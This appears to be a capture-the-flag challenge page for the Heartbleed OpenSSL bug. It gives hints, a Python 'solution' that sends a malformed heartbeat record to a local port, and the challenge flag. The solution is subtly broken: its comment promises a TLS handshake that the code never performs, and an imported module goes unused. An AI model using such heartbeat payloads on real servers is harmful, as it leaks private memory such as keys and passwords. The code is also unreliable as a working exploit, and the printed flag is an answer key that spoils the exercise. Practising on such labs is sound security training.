# Challenge: Heartbleed

**Port:** 44313  
**Difficulty:** Hard  
**CVE:** CVE-2014-0160  
**OWASP:** A06:2021 – Vulnerable Components

The server runs an old version of OpenSSL (1.0.1f) vulnerable to Heartbleed. Memory leak can expose the flag.

**Hints:**
1. Send a malformed Heartbeat request with a short payload but large length field.
2. The server returns excess memory contents.
3. The flag is in the leaked memory.

**Solution:**
```bash
python3 -c "
import socket
import struct
import ssl

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 44313))
# TLS handshake then malicious heartbeat
payload = b'\x18\x03\x02\x00\x03\x01\x40\x00'
s.send(payload)
resp = s.recv(65535)
print(resp)
"
```
Flag: `BHEDA{tls_heartbleed_memory_leak}`
